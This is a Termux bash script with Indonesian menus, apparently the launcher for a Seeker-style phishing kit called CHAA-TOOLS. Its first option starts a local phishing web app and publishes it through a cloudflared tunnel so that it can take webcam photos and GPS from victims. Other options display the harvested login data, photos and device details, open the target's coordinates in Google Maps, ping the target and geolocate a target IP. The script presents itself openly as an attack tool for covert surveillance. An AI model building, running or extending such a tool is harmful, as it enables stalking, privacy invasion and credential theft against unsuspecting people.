#!/data/data/com.termux/files/usr/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

show_menu() {
    clear
    echo -e "${CYAN}     ██████╗██╗  ██╗ █████╗  █████╗     ████████╗ ██████╗ ██╗     ███████╗${NC}"
    echo -e "${CYAN}    ██╔════╝██║  ██║██╔══██╗██╔══██╗    ╚══██╔══╝██╔═══██╗██║     ██╔════╝${NC}"
    echo -e "${CYAN}    ██║     ███████║███████║███████║       ██║   ██║   ██║██║     ███████╗${NC}"
    echo -e "${CYAN}    ██║     ██╔══██║██╔══██║██╔══██║       ██║   ██║   ██║██║     ╚════██║${NC}"
    echo -e "${CYAN}    ╚██████╗██║  ██║██║  ██║██║  ██║       ██║   ╚██████╔╝███████╗███████║${NC}"
    echo -e "${CYAN}     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚══════╝╚══════╝${NC}"
    echo ""
    echo -e "${CYAN}╔════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${NC}       ${YELLOW}⚡ CHAA-TOOLS v2.1 ⚡${NC}                       ${CYAN}║${NC}"
    echo -e "${CYAN}╠════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${NC}  ${WHITE}Author   : nzm${NC}                                   ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${WHITE}Version  : 2.1${NC}                                   ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC}  ${WHITE}Status   : ${GREEN}DEVELOPER${NC}                             ${CYAN}║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}[ MAIN MENU ]${NC}"
    echo ""
    echo -e "${GREEN}  [01]${NC}  📸  CAMERA PHISH (WEBCAM + GPS)"
    echo -e "${GREEN}  [02]${NC}  📊  CEK HASIL (FOTO + IP + GPS)"
    echo -e "${GREEN}  [03]${NC}  📂  BUKA + COPY FOTO (SEKALIGUS)"
    echo -e "${GREEN}  [04]${NC}  📍  BUKA LOKASI TARGET (MAPS)"
    echo -e "${GREEN}  [05]${NC}  📶  CEK KONEKSI TARGET (PING)"
    echo -e "${GREEN}  [06]${NC}  🌐  CEK IP PUBLIK SENDIRI"
    echo -e "${GREEN}  [07]${NC}  📱  CEK DEVICE INFO TARGET"
    echo -e "${GREEN}  [08]${NC}  🎯  IP TRACKER"
    echo -e "${RED}  [00]${NC}  🚪  KELUAR"
    echo -e "${CYAN}  [99]${NC}  🧹  CLEAR LAYAR"
    echo ""
    echo -e "${CYAN}  ══════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}  📌 CHAA TOLS (SEEKER)${NC}"
    echo -e "${CYAN}  ══════════════════════════════════════════════════${NC}"
    echo ""
    read -p "➤ Pilih menu : " menu

    case $menu in
        1)
            echo -e "${YELLOW}🔥 Memulai Camera Phish...${NC}"
            echo -e "${YELLOW}⏳ Mohon tunggu...${NC}"
            echo -e "${YELLOW}📌 Tekan ${GREEN}ENTER${YELLOW} untuk kembali ke menu${NC}"
            cd ~/cha-phish/"ai mamb" && python app.py > /dev/null 2>&1 &
            sleep 4
            cloudflared tunnel --url http://localhost:8080 2>&1 | grep -o 'https://[^ ]*\.trycloudflare\.com' &
            CLOUD_PID=$!
            read -p ""
            echo -e "\n${YELLOW}⏹ Menghentikan tunnel...${NC}"
            kill $CLOUD_PID 2>/dev/null
            pkill -f python 2>/dev/null
            show_menu
            ;;
        2)
            echo -e "${GREEN}▶ CEK HASIL${NC}"
            cd ~/cha-phish/"ai mamb"/captured
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            echo -e "${YELLOW}📊 DATA LOGIN + GPS${NC}"
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            cat data.txt 2>/dev/null || echo "Belum ada data"
            echo ""
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            echo -e "${YELLOW}📸 DAFTAR FOTO${NC}"
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            ls images/ 2>/dev/null || echo "Belum ada foto"
            echo ""
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        3)
            echo -e "${GREEN}▶ BUKA + COPY FOTO${NC}"
            cd ~/cha-phish/"ai mamb"/captured/images
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            echo -e "${YELLOW}📸 DAFTAR FOTO${NC}"
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            ls 2>/dev/null || echo "Belum ada foto"
            echo ""
            read -p "Masukkan nama file foto: " foto
            if [ -f "$foto" ]; then
                termux-open "$foto" 2>/dev/null
                cp "$foto" /sdcard/DCIM/Camera/ 2>/dev/null
                echo -e "${GREEN}✅ Foto dibuka & disalin ke galeri!${NC}"
            else
                echo -e "${RED}❌ File tidak ditemukan!${NC}"
            fi
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        4)
            echo -e "${GREEN}▶ BUKA LOKASI TARGET DI MAPS${NC}"
            cd ~/cha-phish/"ai mamb"/captured
            COORD=$(grep -v '127.0.0.1' data.txt 2>/dev/null | grep -oE 'GPS    : [0-9.-]+, [0-9.-]+' | tail -1 | sed 's/GPS    : //')
            if [ -n "$COORD" ]; then
                echo -e "${YELLOW}📍 Buka maps: $COORD${NC}"
                termux-open "https://maps.google.com/?q=$COORD"
            else
                echo -e "${RED}❌ Belum ada GPS target!${NC}"
            fi
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        5)
            echo -e "${GREEN}▶ CEK KONEKSI TARGET${NC}"
            cd ~/cha-phish/"ai mamb"/captured
            IP=$(grep -oE 'IP PUBLIK : [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' data.txt 2>/dev/null | tail -1 | awk '{print $4}')
            if [ -n "$IP" ]; then
                echo -e "${YELLOW}📍 Ping ke $IP ...${NC}"
                ping -c 4 $IP
            else
                echo -e "${RED}❌ Belum ada IP target!${NC}"
            fi
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        6)
            echo -e "${GREEN}▶ CEK IP PUBLIK SENDIRI${NC}"
            echo -e "${YELLOW}🌐 IP publik lo:${NC}"
            curl -s ifconfig.me
            echo ""
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        7)
            echo -e "${GREEN}▶ CEK DEVICE INFO TARGET${NC}"
            cd ~/cha-phish/"ai mamb"/captured
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            echo -e "${YELLOW}📱 DEVICE INFO TARGET${NC}"
            echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
            cat device_info.txt 2>/dev/null || echo "Belum ada data device"
            echo ""
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        8)
            echo -e "${GREEN}▶ IP TRACKER${NC}"
            echo ""
            read -p "Masukkan IP target: " target_ip
            if [ -z "$target_ip" ]; then
                echo -e "${RED}❌ IP tidak boleh kosong!${NC}"
                read -p "Tekan Enter untuk kembali..."
                show_menu
                return
            fi
            echo -e "${YELLOW}⏳ Melacak IP...${NC}"
            response=$(curl -s "http://ip-api.com/json/$target_ip?fields=status,message,country,regionName,city,lat,lon,isp,org,as,timezone,mobile,proxy,hosting")
            status=$(echo "$response" | jq -r '.status' 2>/dev/null)
            if [ "$status" == "fail" ]; then
                message=$(echo "$response" | jq -r '.message' 2>/dev/null)
                echo -e "${RED}❌ Gagal: $message${NC}"
            elif [ -z "$status" ]; then
                echo -e "${RED}❌ Gagal: respon tidak valid${NC}"
            else
                country=$(echo "$response" | jq -r '.country' 2>/dev/null)
                region=$(echo "$response" | jq -r '.regionName' 2>/dev/null)
                city=$(echo "$response" | jq -r '.city' 2>/dev/null)
                lat=$(echo "$response" | jq -r '.lat' 2>/dev/null)
                lon=$(echo "$response" | jq -r '.lon' 2>/dev/null)
                isp=$(echo "$response" | jq -r '.isp' 2>/dev/null)
                org=$(echo "$response" | jq -r '.org' 2>/dev/null)
                asn=$(echo "$response" | jq -r '.as' 2>/dev/null)
                tz=$(echo "$response" | jq -r '.timezone' 2>/dev/null)
                mobile=$(echo "$response" | jq -r '.mobile' 2>/dev/null)
                proxy=$(echo "$response" | jq -r '.proxy' 2>/dev/null)
                hosting=$(echo "$response" | jq -r '.hosting' 2>/dev/null)
                echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
                echo -e "${YELLOW}📍 INFO IP TARGET${NC}"
                echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
                echo -e "${WHITE}IP        :${NC} $target_ip"
                echo -e "${WHITE}Negara    :${NC} $country"
                echo -e "${WHITE}Region    :${NC} $region"
                echo -e "${WHITE}Kota      :${NC} $city"
                echo -e "${WHITE}Koordinat :${NC} $lat, $lon"
                echo -e "${WHITE}ISP       :${NC} $isp"
                echo -e "${WHITE}Organisasi:${NC} $org"
                echo -e "${WHITE}ASN       :${NC} $asn"
                echo -e "${WHITE}Timezone  :${NC} $tz"
                echo -e "${WHITE}Mobile    :${NC} $mobile"
                echo -e "${WHITE}Proxy/VPN :${NC} $proxy"
                echo -e "${WHITE}Hosting   :${NC} $hosting"
                echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
                echo ""
                echo -e "${GREEN}➤ Buka Google Maps? (y/n)${NC}"
                read -p "Pilihan: " open_map
                if [[ "$open_map" == "y" || "$open_map" == "Y" ]]; then
                    termux-open "https://maps.google.com/?q=$lat,$lon"
                fi
            fi
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        0)
            echo -e "${RED}Keluar...${NC}"
            exit
            ;;
        99)
            clear
            echo -e "${GREEN}✅ Layar dibersihkan!${NC}"
            read -p "Tekan Enter untuk kembali..."
            show_menu
            ;;
        *)
            echo -e "${RED}❌ Pilihan salah!${NC}"
            sleep 1
            show_menu
            ;;
    esac
}

# ====== INTRO ======
clear
echo -e "${CYAN}     ██████╗██╗  ██╗ █████╗  █████╗     ████████╗ ██████╗ ██╗     ███████╗${NC}"
echo -e "${CYAN}    ██╔════╝██║  ██║██╔══██╗██╔══██╗    ╚══██╔══╝██╔═══██╗██║     ██╔════╝${NC}"
echo -e "${CYAN}    ██║     ███████║███████║███████║       ██║   ██║   ██║██║     ███████╗${NC}"
echo -e "${CYAN}    ██║     ██╔══██║██╔══██║██╔══██║       ██║   ██║   ██║██║     ╚════██║${NC}"
echo -e "${CYAN}    ╚██████╗██║  ██║██║  ██║██║  ██║       ██║   ╚██████╔╝███████╗███████║${NC}"
echo -e "${CYAN}     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝       ╚═╝    ╚═════╝ ╚══════╝╚══════╝${NC}"
echo ""
echo -e "${CYAN}╔════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║${NC}       ${YELLOW}⚡ CHAA-TOOLS v2.1 ⚡${NC}                       ${CYAN}║${NC}"
echo -e "${CYAN}╠════════════════════════════════════════════════════╣${NC}"
echo -e "${CYAN}║${NC}  ${WHITE}Author   : nzm${NC}                                   ${CYAN}║${NC}"
echo -e "${CYAN}║${NC}  ${WHITE}Version  : 2.1${NC}                                   ${CYAN}║${NC}"
echo -e "${CYAN}║${NC}  ${WHITE}Status   : ${GREEN}DEVELOPER${NC}                             ${CYAN}║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
text="     All tools by nzm"
for ((i=0; i<${#text}; i++)); do
    echo -ne "${YELLOW}${text:$i:1}${NC}"
    sleep 0.05
done
echo ""
echo -e "${CYAN}─────────────────────────────────────────────────${NC}"
echo -e "${GREEN}Loading${NC}"
for i in {0..100..2}; do
    echo -ne "\r["
    for ((j=0; j<$i/2; j++)); do
        echo -ne "${GREEN}#${NC}"
    done
    for ((j=$i/2; j<50; j++)); do
        echo -ne "${WHITE}.${NC}"
    done
    echo -ne "] ${i}%"
    sleep 0.04
done
echo -e "\n${GREEN}✅ Loaded!${NC}"
sleep 0.5
show_menu
